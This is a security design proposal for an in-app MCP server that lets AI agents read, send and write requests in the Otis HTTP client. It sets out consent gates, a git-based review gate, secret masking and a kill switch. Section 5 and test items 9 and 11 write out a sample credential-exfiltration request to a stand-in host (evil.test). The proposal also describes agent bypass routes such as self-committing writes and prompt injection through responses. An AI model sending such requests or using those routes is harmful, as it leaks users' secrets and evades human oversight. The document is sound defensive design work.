# The MCP server — proposal

**Status: proposal. Nothing in this document is implemented.** It is written to
be approved, rejected or argued with first, because the feature can send
authenticated requests to production systems and the security design *is* the
feature rather than a wrapper around it.

Read `VISION.md` §3 first. The line it draws under secrets is the constraint
everything here bends around.

---

## 1. What it is, and why it lives inside Otis

An MCP server that lets an agent — Claude Code, or anything else that speaks
the protocol — read a collection and, if you let it, send its requests and add
to it.

There are already MCP servers that wrap an HTTP client's CLI. This one is
**in-process**, inside the running app, and that is the whole point: it can
reach the things that only exist in a running Otis.

- **Session variables.** A value a post-response script set (`FORMAT.md` §4.5)
  lives in memory in the open collection and is in no file. A CLI wrapper
  starts a fresh process per call and cannot see it, so an agent driving one
  cannot do the thing people actually need — create a resource, then act on the
  id that came back. §8 shows that flow working.
- **The held response.** A response body stays in Go and is paged out a
  screenful at a time (`CLAUDE.md`). The agent reads it the same way, so a
  40 MB body does not become a 40 MB tool result.
- **The human.** A confirmation an agent needs can appear in the window the
  person is already looking at. A CLI wrapper has nowhere to ask.
- **One resolver.** The agent's send goes through the same resolve → prepare →
  send path as the Send button and `otis run`, so it cannot disagree with them
  about what a request means.

Library: **`github.com/mark3labs/mcp-go` v1.0.0** — `server.NewMCPServer`,
`mcp.NewTool`, `server.NewStreamableHTTPServer`.

## 2. Transport and authentication

**A loopback listener, `127.0.0.1` on an OS-assigned port, with a token minted
at startup.** Never `0.0.0.0`. Never a fixed port. Never a port without a
token.

The brief allowed serving this over the existing Wails asset server instead. It
will not work: that server answers a custom scheme inside the webview and is
not an HTTP endpoint another process on the machine can reach. So a listener it
is, and being a real listener it needs real defences:

| | |
| --- | --- |
| Bind | `127.0.0.1` only, explicitly — not `localhost`, which can resolve to a non-loopback address |
| Port | `0`, so the OS assigns one. Written to the config dir so a client can find it; changes every launch |
| Token | 32 bytes from `crypto/rand`, base64url. Minted when the server is enabled, never persisted |
| Every request | `Authorization: Bearer <token>`, compared with `crypto/subtle.ConstantTimeCompare` |
| `Origin` | Rejected unless absent or loopback. **This is the DNS-rebinding defence** and it is not optional: without it any web page you visit can drive this server through your browser |
| `Host` | Rejected unless loopback |

The token and port are written to `<config>/otis/mcp.json`, mode `0600`, and
the file is deleted when the server stops. That is how a client is configured:

```jsonc
// ~/.claude/mcp.json  (or equivalent)
{
  "otis": {
    "type": "http",
    "url": "http://127.0.0.1:<port>/mcp",
    "headers": { "Authorization": "Bearer <token>" }
  }
}
```

> **Open decision (§14.1).** A port and token that change every launch mean
> re-reading that file each time. The alternative is a stable port, which is a
> worse security posture for a marginal convenience. My recommendation is to
> keep it unstable and ship a `otis mcp config` command that prints the current
> block for pasting.

## 3. Capabilities: READ, RUN and WRITE

Three switches. **All off by default, and the app ships with the server itself
off.**

| Capability | Grants | Default |
| --- | --- | --- |
| — | nothing; no listener at all | **off** |
| READ | `list_requests`, `get_request`, `list_environments`, `get_session_variables`, `get_last_response`, `get_test_results` | **off** |
| RUN | `send_request`, `run_folder` | **off** |
| WRITE | `create_request`, `create_folder`, `update_request` | **off** |

RUN without READ is allowed and is not silly: an agent told exactly which
request to send does not need to enumerate the collection.

**WRITE requires the collection to be a git repository**, and the app refuses
to enable it otherwise. The mechanism that makes WRITE safe is §5's review
gate, and that gate is `git status`; with no git there is no notion of
reviewed and therefore no gate. READ and RUN are unaffected — a collection is
a directory of files and works perfectly well outside version control
(`CLAUDE.md`), it just cannot host an agent that writes.

Enabling any of them is a click in the app, per-machine, and persisted in
`settings.json` under a new `mcp` key — never in the collection. Whether *you*
let an agent drive your machine is not a fact about the repository, and a
committed switch would be one person deciding it for the whole team.

**Turning RUN on does not grant sending, and turning WRITE on does not grant
sending what was written.** It grants the *tool*. Whether a
given call proceeds is §4, §5 and §6.

## 4. Per-environment policy

An environment carries its own agent policy, committed, under the reserved
`$otis` key `FORMAT.md` §4.3 already defines. This extends that section:

```json
{
  "$otis": {
    "description": "production",
    "confirmBeforeSend": true,
    "agents": "deny"
  },
  "baseUrl": "https://api.acme.com"
}
```

`agents` takes three values:

| Value | Meaning |
| --- | --- |
| `"deny"` | No agent may send against this environment. The tool refuses and says why |
| `"confirm"` | Every call needs an in-app confirmation. **The default** |
| `"allow"` | Calls proceed without asking |

Committed, deliberately, for the same reason `confirmBeforeSend` is: whether an
environment is the dangerous one is a fact about the environment, the whole
team should get the same answer, a fresh clone should get it without
configuring anything, and weakening it should show up in review.

Three rules make the defaults safe:

1. **The default is `confirm`, not `allow`.** An environment that says nothing
   gets a human in the loop. Opting *out* is the deliberate act.
2. **`confirmBeforeSend: true` forces at least `confirm`, and `"allow"` beside
   it is an error naming the file.** That flag is the committed marker of "this
   is production". An agent policy that could downgrade it would let a
   convenience setting quietly cancel a safety one.
3. **No environment selected is treated as `confirm`.** With no environment
   there is no way to reason about where a request points, and a request may
   carry a literal URL.

Unknown values are an error naming the key, not a silent fallback — `"agents":
"alow"` must not read as permission.

## 5. The review gate: git decides what is trusted

WRITE and RUN together are the dangerous combination, and not for the obvious
reason. An agent that can write a file can write this one:

```
POST https://evil.test/collect
Authorization: Bearer {{apiKey}}
```

It never *sees* the secret — §7 holds to the letter — but it chose where the
secret goes. That would defeat the point of §7 while satisfying its wording,
and it would dissolve the boundary that makes the rest of this document mean
anything: that an agent can only send what somebody reviewed.

So the boundary is not "an agent cannot compose a request". It is:

> **A request file that git does not report as clean is unreviewed.** Sending
> an unreviewed request always requires confirmation, whatever the environment
> policy says — and **is refused outright if resolving it would consume a
> secret.**

Clean means git reports no difference from `HEAD` for that path. Untracked
counts as unreviewed. **Staged-but-uncommitted also counts as unreviewed**,
because `HEAD` is what was reviewed and staging is something you do *before*
reading the diff.

Why this is better than anything policy-based:

- It is **not trust**. `internal/git` already reports per-path status — it is
  what draws the tree's dots — so this is enforced by the same fact the UI
  already shows, not by a flag an agent or a setting could relax.
- **`"allow"` cannot override it.** An environment marked `"allow"` still
  confirms an unreviewed send, and still refuses an unreviewed send that uses a
  secret. The two gates are independent and both must pass.
- **It closes exfiltration completely.** To send a secret, a request must be
  clean. To be clean, its URL must be committed. To be committed, a person put
  it there. The refusal is flat rather than a dialog, because a dialog is a
  thing a tired person clicks.
- **It applies to your own edits too**, which is the right answer rather than a
  side effect: a request you have half-rewritten is not one an agent should
  send without asking.
- **An agent's writes surface where your own do** — the tree's `M` and `U`
  dots, the status bar's count, the diff view. No new indicator is needed
  because a write by an agent is a change to the working tree like any other,
  and `⌘G` shows exactly what it did.

The last point is why the audit log (§9) does not record file contents: git
already has them, in more detail and with a diff.

## 6. The consent model

**Every call that needs confirmation gets its own confirmation. There is no
session-wide approval, no "allow for 10 minutes", and no "always allow".**

The gate lives where the existing one lives — `send-context`, which already
holds the `confirmBeforeSend` gate for the Send button, ⌘↵, the palette and
folder runs, on the argument that "a safety feature with a hole in it is not
one". An agent send is one more caller, and it must not get its own path.

The flow for a call that needs confirmation:

1. The tool handler resolves the request far enough to know **what it would
   do**: method, the resolved URL with secrets masked, the environment, and
   whether a secret would be used.
2. It raises a confirmation in the window and **blocks**.
3. The window shows a modal naming the agent, the tool, and those details.
   Two buttons: **Send once** and **Refuse**.
4. The person answers. Refusal returns an error the agent can read. No answer
   within **60 seconds** is a refusal — an agent must not be able to leave a
   dialog up indefinitely, and a call that hangs forever is worse for the agent
   than one that fails.
5. Only then does the send happen.

Consequences worth stating plainly:

- An agent cannot batch approvals. Ten sends against a `confirm` environment
  are ten dialogs. That is the intended friction; if it is too much, the answer
  is `"allow"` on a safe environment, not a weaker gate.
- `run_folder` against a `confirm` environment asks **once per request in the
  folder**, not once for the folder. A folder run is N sends and the policy is
  per send. A twenty-request folder is therefore impractical to run against
  production from an agent, which is correct.
- If no window is open, or the collection is closed, a call needing
  confirmation fails. There is nobody to ask.

## 7. Secrets

**An agent can cause a request to be sent using a keychain secret, and never
receives the value.** This follows `VISION.md` §3 with no new machinery,
because the machinery is already there.

- Resolution runs as it does for any send. The value reaches the wire and
  nothing else.
- Every tool result is passed through **the request's own masker**
  (`resolve.Resolved.Mask`), which replaces every secret value the request used
  with `•••••`. Same function the logs and the window use.
- **Response bodies are masked too, and that matters.** A server that echoes
  your `Authorization` header — httpbin does; so do plenty of debug endpoints —
  would otherwise hand the agent the credential it was never given. The masker
  already registers the values used by the request, so it catches them coming
  back. This is the single most important line in this document to get right,
  and §15 tests it directly.
- `list_environments` reports that a variable **is** a secret and never its
  value, exactly as `EnvironmentRow` does for the window.
- `get_session_variables` marks a session value secret if it came from one, and
  withholds it.
- No tool takes a secret as an argument. There is no way for an agent to set
  one, and no tool writes to the keychain.

## 8. Session state: the multi-step flow

This is the capability a CLI wrapper cannot offer, so here it is end to end.
Given `orders/create-order.http` with a post-response script:

```
> {% vars.session.set("orderId", response.body.id) %}
```

and `orders/get-order.http` whose URL is `{{baseUrl}}/orders/{{orderId}}`:

```jsonc
// 1. The agent sends the first request.
→ send_request { "path": "orders/create-order.http" }
← { "status": 201, "sendId": "s_7f2a",
    "tests": { "passed": 2, "failed": 0 },
    "sessionVariablesSet": [
      { "name": "orderId", "scope": "folder", "owner": "orders" }
    ] }

// The value is NOT in that result. It is in Otis' session store, and the
// agent is told a variable was set rather than what it is — the same way a
// person sees the Variables panel gain a row.

// 2. The agent can look, if READ is on.
→ get_session_variables { "folder": "orders" }
← { "variables": [
      { "name": "orderId", "value": "ord_01H9Z", "scope": "folder",
        "owner": "orders", "setBy": "orders/create-order.http",
        "at": "2026-09-04T11:02:41Z", "secret": false } ] }

// 3. And the second request resolves {{orderId}} from it, with no argument
//    passed and nothing written to any file.
→ send_request { "path": "orders/get-order.http" }
← { "status": 200, "sendId": "s_7f2b",
    "resolvedUrl": "https://api.acme.dev/orders/ord_01H9Z" }
```

Step 3 is the point. The agent did not carry the id between calls, did not
write it to a file, and could not have — the value exists only in the running
app's memory, and it will be gone when the collection closes.

Two properties this inherits from `FORMAT.md` §4.5 and must keep: a session
value is **literal**, so a `{{` arriving in a response cannot reach into the
variable scope; and it is **written nowhere**, so an agent cannot use the
session store as a way to leave state behind.

## 9. The audit log

Every tool call is recorded, whatever the outcome:

| Field | |
| --- | --- |
| `at` | when |
| `tool` | which tool |
| `target` | the request or folder node path |
| `environment` | the environment name, or `""` |
| `decision` | `allowed` · `confirmed` · `refused` · `denied-by-policy` · `timed-out` · `rate-limited` |
| `status` | the HTTP status, the failure kind, or `created` / `modified` for a write |
| `duration` | how long it took |
| `client` | the MCP client's declared name and version |

**What is deliberately not in it:** no request body, no response body, no
headers, no secret value, no session variable value, and **no file contents for
a write**. An audit log is a record of *what was done*, and one that quoted
payloads would become the thing you have to protect.

For writes that division is not a compromise but the right split: git already
holds what changed, in more detail and with a diff, and `⌘G` shows it. The
audit log says *that* the agent touched `orders/create-order.http` at 11:02;
the diff view says what it did to it.

Inspectable from the UI: a panel listing the calls, newest first, with the
in-app indicator (§11) as its way in.

> **Open decision (§14.2).** In memory for the session, or appended to
> `<config>/otis/mcp-audit.jsonl`? In memory matches how session state works
> and leaves nothing behind. A file is what makes it an audit log rather than a
> readout — but it records which endpoints you called, which is a privacy
> artifact that did not exist before. My recommendation: in memory by default,
> with persistence a setting, off.

## 10. Rate limiting and the kill switch

**Rate limits**, per capability, token bucket:

| | Sustained | Burst |
| --- | --- | --- |
| READ | 10/s | 30 |
| RUN | 1/s | 5 |
| WRITE | 2/s | 10 |

WRITE is limited more loosely than RUN because a write is recoverable and a
send is not — but it is limited at all, because an agent in a loop creating
files is a mess someone has to clean up by hand.

A call needing confirmation consumes its budget when it is *approved*, not when
it is asked. Otherwise an agent could exhaust the bucket with calls a person
refuses, and refusing would cost the person their own next send.

Exceeding a limit returns an MCP error and is logged as `rate-limited`. The
limits are per running app, not per client.

**The kill switch.** One control, in the indicator's popover and in the
palette: *Disconnect agents*.

1. The token is revoked immediately, so the next call fails authentication.
2. In-flight tool calls are cancelled, including sends already on the wire —
   the same cancellation `SendService.Cancel` already does.
3. The listener closes and `mcp.json` is deleted.
4. Both capabilities flip off, so a reconnect is not enough; re-enabling is a
   deliberate act.

A new token is minted next time the server is enabled. There is no way to get
the old one back.

## 11. The in-app indicator

**When the server is enabled, the title strip carries a chip; when a client is
actually connected, the chip is live.** The design does not draw one, so this
is a `DESIGN-NOTES` §10 item (§14.3), but its content is not in doubt:

- Off: nothing at all. A feature that is off should not occupy the chrome.
- Enabled, nothing connected: `agent · idle`, in `--fg-dim`.
- Connected: `agent · <client name>` with a live dot, and **the accent is not
  the right colour for it** — the accent means "good" in this design (§2.4),
  and an agent holding your credentials is a state to be aware of, not a
  success. Amber (`--modified`) is the closer reading.
- A confirmation waiting: the chip counts it.

Clicking it opens a popover with the two capability switches, the connected
client, the audit log, and *Disconnect agents*.

The status bar's right slot already carries the current view's context and is
not a good home: this is app state, not view state, and it must be visible on
every screen including the diff and the empty state.

## 12. Tool surface

Refined from the brief. Every result is masked (§7). Every path is a
collection-relative node path (`FORMAT.md` §2.1).

### READ

**`list_requests`** — the collection as a tree.
`{ folder?: string, includeFolders?: boolean }` →
`{ requests: [{ path, name, method, folder }], folders: [...] }`
The same tree the sidebar draws and `otis ls` prints.

**`get_request`** — one request, as it would be sent.
`{ path: string, environment?: string }` →
`{ path, name, method, url, headers: [{ name, value, source, inherited }],
   auth: { kind, source, secret }, body: { kind, contentType, preview },
   variables: [{ name, resolved, origin, secret }], warnings: [] }`
Effective values with provenance, not the raw file: the agent should see what
will happen, which is the same thing the editor shows a person. `body.preview`
is capped at 4 KB; `resolvedUrl` is masked.

**`list_environments`** —
`{ environments: [{ name, description, active, confirmBeforeSend, agents,
   variables: [{ name, secret }] }] }`
Names and shapes. Never a value, secret or not — an environment's non-secret
values are still somebody's infrastructure.

**`get_session_variables`** — what runs have set (§8).
`{ folder?: string }` → `{ variables: [{ name, value, scope, owner, setBy, at,
secret }] }`. `value` is withheld when `secret`.

**`get_last_response`** — the held response, paged.
`{ sendId?: string, offset?: number, limit?: number }` →
`{ status, statusText, headers, timing, size, body: { lines, offset, total,
truncated } }`
Paged for the reason the window pages it: a body never crosses a boundary
whole. `limit` defaults to 200 lines and is capped at 1000. Omitting `sendId`
means the most recent send.

**`get_test_results`** — assertions from a send or run.
`{ sendId?: string }` → `{ passed, failed, tests: [{ name, ok, message }] }`

### RUN

**`send_request`** — send one request.
`{ path: string, environment?: string }` →
`{ sendId, status, statusText, timing, size, resolvedUrl,
   tests: { passed, failed }, sessionVariablesSet: [{ name, scope, owner }] }`
Naming an `environment` is allowed and is policy-checked like any other; it
does not change the app's active environment, because an agent must not be able
to silently repoint the human's next send.

**`run_folder`** — run a folder in order.
`{ path: string, stopOnFailure?: boolean }` →
`{ runId, results: [{ path, status, tests }], summary: { sent, passed, failed } }`
Confirmation is per request (§6).

### WRITE

Every one of these goes through the service `CLAUDE.md` already names as the
only writer of that kind of file, so an agent's write is subject to the same
invariants a person's is: it holds the write guard, it is atomic, it announces
itself, and **it does not touch `.order`**.

Everything written here is unreviewed by definition, so §5 applies to it
immediately: sending it will confirm, and will be refused if it would use a
secret.

**`create_request`** — a new request file.
`{ folder: string, name: string, text?: string }` → `{ path, slug }`
`RequestService.Create`, which names the file for the slug of `name` and keeps
`name` verbatim as the `# @name` directive (`FORMAT.md` §7). `text`, if given,
replaces the default body and must parse. `path` is the node path Go actually
used — it may carry a `-2` the agent did not ask for, and the agent must use
what comes back.

**`create_folder`** — a new folder.
`{ parent: string, name: string }` → `{ path, slug }`
`FolderService.Create`, which also writes the `_folder.http` that makes git
track the directory.

**`update_request`** — replace a request's text.
`{ path: string, text: string }` → `{ path, status: "modified" }`
`RequestService.SaveText`, which refuses text that does not parse. Whole-file
replacement rather than a structured patch: the file *is* the format, an agent
reading `get_request` and writing `update_request` round-trips through the same
thing a person edits, and a patch API would be a second answer to what a
request is.

A script an agent writes is worth a sentence, since `update_request` can carry
one: it runs in the same sandbox as any other (`FORMAT.md` §9.3 — no
filesystem, no process, no network, no timers) and sees a secret only as an
opaque handle, so it is not a way around §7 either.

### Not exposed, on purpose

- **No rename and no delete.** Creating and editing are recoverable — the file
  is in the working tree and `git checkout` undoes it. A delete of something
  uncommitted is not, and neither is a rename that loses history. Nothing an
  agent does should be unrecoverable by the tools the person already has.
- **No environment writes.** No tool creates an environment, changes a
  variable, or edits `$otis` — the last of which would let an agent grant
  itself permission.
- **No `.order` writes.** Reordering is a human preference and `order.go`
  stays the only writer.
- **No secret access of any kind**, read or write.
- **No git.** No commit, stage, or discard. `internal/diff` is the only thing
  that writes to a repository and it stays a human affordance. This one matters
  more now that WRITE exists: an agent that could commit could make its own
  writes "reviewed" and walk straight through §5.
- **No `clear_session`.** Reaching into the human's session state to destroy it
  is not something an agent needs.
- **No collection creation, and no switching collections.** Every other tool is
  scoped to the open collection, and that scope is what bounds them all. A tool
  that created one would have no scope — it is arbitrary directory creation at
  a path the agent chooses. A tool that switched one would change which
  keychain entries resolve, since a secret is keyed
  `<collection>/<env>/<name>` (`FORMAT.md` §5). Neither is built for a person
  yet either: Clone and Start fresh are `soon` in the empty state and
  `DESIGN-NOTES` §9.9 records that they are not in the A–E plan.

**The boundary, stated plainly.** With WRITE off, an agent can send only what
is in the collection, which means only what somebody reviewed. With WRITE on,
an agent can compose a request — but it cannot send that request without a
person reading the resolved URL, and it cannot send it *at all* if a secret is
involved. What an agent can never do is send a credential somewhere a human
did not put in a committed file.

That is a weaker boundary than "cannot compose", and the trade is deliberate:
in exchange, an agent can scaffold the boring half of a collection. The thing
that has to hold for the trade to be sound is §5, which is why it is enforced
by `git status` rather than by policy.

## 13. What this protects against, and what it does not

**Does:**
- An agent reading a secret value — architecturally, not by policy (§7).
- An agent sending to production without a person seeing it (§4, §6).
- Another process or user on the machine driving it — token, loopback bind.
- A web page driving it through your browser — `Origin` and `Host` checks.
- An agent sending a secret anywhere a person did not put in a committed file
  (§5) — including a request the agent wrote itself, which is refused outright
  rather than confirmed.
- An agent making its own writes look reviewed: it cannot commit, stage or
  discard (§12).
- Runaway loops — rate limits, and a kill switch that means it.

**Does not:**
- **A malicious agent within its grant.** If you enable RUN and mark an
  environment `"allow"`, an agent can send those requests as fast as the rate
  limit permits. That is the grant working, not failing.
- **An agent changing a request you already reviewed.** With WRITE on, it can.
  §5 means it cannot then *send* it without you reading the resolved URL, and
  the change shows up as an `M` in the tree and in the diff — but the file did
  change under you, and if you commit without reading the diff you have
  reviewed nothing. This is the cost of the WRITE grant and there is no
  mechanism here that removes it.
- **A confused person clicking through confirmations.** A dialog is only as
  good as its reading, which is why the confirmation names the method, the
  resolved URL and the environment rather than asking "allow?".
- **Anything a request itself does.** Otis sends what the collection says. A
  reviewed request that deletes a production table will delete it.
- **Another local process reading `mcp.json`.** It is mode `0600`, which stops
  other *users*, not other processes running as you. A local attacker with your
  uid has your keychain anyway.
- **Prompt injection reaching the agent through a response body.** A response
  can carry text that tries to instruct the agent. Otis cannot prevent that and
  should not pretend to; what it can do is make sure the *next* action still
  needs the same consent as the first, which is exactly why there is no
  session-wide approval.

## 14. Open decisions — for you

1. **Port and token stability** (§2). Recommend: unstable, plus
   `otis mcp config` to print the client block.
2. **Audit log persistence** (§9). Recommend: in memory, persistence an
   off-by-default setting.
3. **The indicator's colour and place** (§11). A `DESIGN-NOTES` §10 item;
   recommend the title strip in amber, and I would add it as §9.22 rather than
   decide it here.
4. **`agents` default.** Recommend `"confirm"`. `"deny"` is safer and makes RUN
   useless until every environment is annotated; `"allow"` is indefensible.
5. **Confirmation timeout** (§6). Recommend 60s. Longer leaves dialogs up;
   shorter makes a person racing a timer.
6. **Should RUN require READ?** Recommend no — an agent told exactly what to
   send should not need to enumerate.
7. **Should an unreviewed send that uses a secret be refused, or confirmed with
   a louder dialog?** (§5) Recommend refused. A dialog is a thing a tired
   person clicks, and this is the one case where the failure is
   unrecoverable — the credential is gone the moment it is sent.
8. **Should `update_request` take whole text or a structured patch?** (§12)
   Recommend text, through the existing validated `SaveText`. A patch API would
   be a second answer to what a request is, which is the mistake
   `FORMAT.md` §1.13 exists to prevent.
9. **Should WRITE be allowed at all in a collection with uncommitted changes
   already present?** Recommend yes, with no special case: those files are
   simply unreviewed like any other, and §5 already covers them.

## 15. Verification plan

The brief's list, plus what §7 demands:

1. Connect from Claude Code; exercise every READ tool.
2. Call `send_request` with RUN disabled → refused, naming the capability.
3. Call `send_request` against a `confirmBeforeSend` environment → blocks,
   dialog names method/URL/environment, refusal reaches the agent as an error.
4. Same against `"agents": "deny"` → refused without a dialog.
5. **No secret value in any tool result.** Point a request at an endpoint that
   echoes its request headers, with a keychain-backed bearer token, and assert
   `•••••` in the response body the agent receives. This is the test that would
   catch the worst possible bug and it should exist before anything else does.
6. Multi-step: `send_request` sets a session variable, a second consumes it
   (§8), and the value never appears in the first result.
7. Kill switch mid-session → the next call fails authentication, an in-flight
   send is cancelled, `mcp.json` is gone.
8. Rate limit: exceed RUN's bucket → error, logged as `rate-limited`, and a
   refused confirmation does not consume budget.
9. `Origin: https://evil.test` → rejected. No token → rejected. `0.0.0.0`
   never appears in a bind.
10. Audit log contains every one of the above with the right `decision`, and no
    body, header or secret.
11. **The write gate.** With WRITE and RUN on and the environment marked
    `"allow"`: `create_request` a request pointing at an `httptest` server with
    an `Authorization: Bearer {{apiKey}}` header, then `send_request` it →
    **refused**, because the file is untracked and the send would use a secret.
    This is the exfiltration attempt from §5 and it must not reach the network.
12. The same request without the secret header → confirmed, not sent silently,
    even though the environment says `"allow"`.
13. Commit the file, then send again → proceeds under the environment's policy.
    This is the whole gate: a commit is what makes it reviewed.
14. `update_request` on a clean, committed request → the file becomes `M`, the
    tree shows it, and the next send confirms.
15. `WRITE` cannot be enabled in a collection that is not a git repository, and
    READ and RUN still can.
16. No `rename`, `delete`, environment-write, `.order`-write, commit,
    `create_collection` or `open_collection` tool is registered at all — asserted
    against the registered tool list, so adding one later fails the test.

Tests may not touch the network (`CLAUDE.md`), so 5 and 6 run against an
`httptest` server.

---

**Nothing above is built.** Approve, change or reject it and I will implement
what survives, in the order §15 tests it — starting with the masking test,
because it is the one whose absence would be unrecoverable.
